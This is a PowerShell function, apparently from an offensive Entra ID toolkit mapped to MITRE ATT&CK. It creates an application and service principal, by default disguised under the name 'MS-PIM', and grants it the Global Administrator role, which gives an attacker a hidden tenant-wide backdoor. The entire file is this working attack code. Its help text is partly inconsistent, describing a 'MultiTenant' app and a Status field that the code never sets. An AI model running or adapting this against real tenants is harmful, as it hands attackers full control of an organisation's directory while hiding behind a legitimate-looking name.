function Add-EntraApplication {
    [cmdletbinding()]
    [OutputType([PSCustomObject])]
    param (
        [Parameter(Mandatory = $false)]
        [string]$DisplayName = 'MS-PIM'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'MSGraph'
    }

    process {
        try {
            Write-Verbose "Creating Azure AD Application"
            $uri = "$($sessionVariables.graphUri)/applications"

            $applicationBody = @{
                displayName = $DisplayName
            } | ConvertTo-Json -Depth 10

            $requestParam = @{
                Headers     = $script:graphHeader
                Uri         = $uri
                Method      = 'POST'
                Body        = $applicationBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }
            $appRegistration = Invoke-RestMethod @requestParam

            Write-Verbose "Creating Service Principal for the application"
            $spUri = "$($sessionVariables.graphUri)/servicePrincipals"

            $spBody = @{
                appId = $appRegistration.appId
            } | ConvertTo-Json

            $spRequest = @{
                Headers     = $script:graphHeader
                Uri         = $spUri
                Method      = 'POST'
                Body        = $spBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }

            $servicePrincipal = Invoke-RestMethod @spRequest

            # Add Global Administrator role
            Write-Verbose "Adding Global Administrator role to Service Principal"
            $roleUri = "$($sessionVariables.graphUri)/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref"

            $roleBody = @{
                "@odata.id" = "$($sessionVariables.graphUri)/directoryObjects/$($servicePrincipal.id)"
            } | ConvertTo-Json

            $roleRequest = @{
                Headers     = $script:graphHeader
                Uri         = $roleUri
                Method      = 'POST'
                Body        = $roleBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }

            Invoke-RestMethod @roleRequest

            return [PSCustomObject]@{
                DisplayName                 = $appRegistration.displayName
                ApplicationId               = $appRegistration.appId
                ApplicationObjectId         = $appRegistration.id
                ApplicationCreatedDateTime  = $appRegistration.createdDateTime
                ServicePrincipalDisplayName = $servicePrincipal.displayName
                ServicePrincipalObjectId    = $servicePrincipal.id
                ServicePrincipalType        = $servicePrincipal.servicePrincipalType
                ServicePrincipalEnabled     = $servicePrincipal.accountEnabled
                RoleAssignmentName          = "Global Administrator"
                RoleTemplateId              = "62e90394-69f5-4237-9190-012177145e10"
            }
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
        }
    }
    <#
.SYNOPSIS
Creates an Entra ID Application and assigns Global Administrator role.

.DESCRIPTION
Creates an Entra ID application and service principal, then assigns the Global Administrator directory role to the service principal. No sign-in audience, redirect URIs, or API permissions are configured — only the role assignment.

.PARAMETER DisplayName
Display name for the application. Defaults to 'MS-PIM'.

.EXAMPLE
Add-EntraApplication -DisplayName "MyCustomApp"

Creates an application and service principal named "MyCustomApp" with the Global Administrator role assigned.

Example output:
DisplayName                : MyCustomApp
ApplicationId              : 12345678-1234-1234-1234-123456789012
ApplicationObjectId        : abcdef12-3456-7890-abcd-ef1234567890
ApplicationCreatedDateTime : 2024-01-01T12:00:00Z
ServicePrincipalDisplayName : MyCustomApp
ServicePrincipalObjectId   : fedcba98-7654-3210-fedc-ba9876543210
ServicePrincipalType       : Application
ServicePrincipalEnabled    : True
RoleAssignmentName         : Global Administrator
RoleTemplateId             : 62e90394-69f5-4237-9190-012177145e10
Status                     : Success

This example creates an Entra ID Application named "MyApp" with a sign-in audience of "MultiTenant",
creates its Service Principal, and assigns the Global Administrator role to the Service Principal.

.NOTES
Requires an authenticated Microsoft Graph session with permissions to create applications and assign directory roles.

.OUTPUTS
PSCustomObject with properties:
- DisplayName, ApplicationId, ApplicationObjectId, ApplicationCreatedDateTime
- ServicePrincipalDisplayName, ServicePrincipalObjectId, ServicePrincipalType, ServicePrincipalEnabled
- RoleAssignmentName, RoleTemplateId

.LINK
https://learn.microsoft.com/en-us/graph/overview

.LINK
MITRE ATT&CK Tactic: TA0042 - Resource Development
https://attack.mitre.org/tactics/TA0042/

.LINK
MITRE ATT&CK Technique: T1583.006 - Acquire Infrastructure: Web Services
https://attack.mitre.org/techniques/T1583/006/
#>
}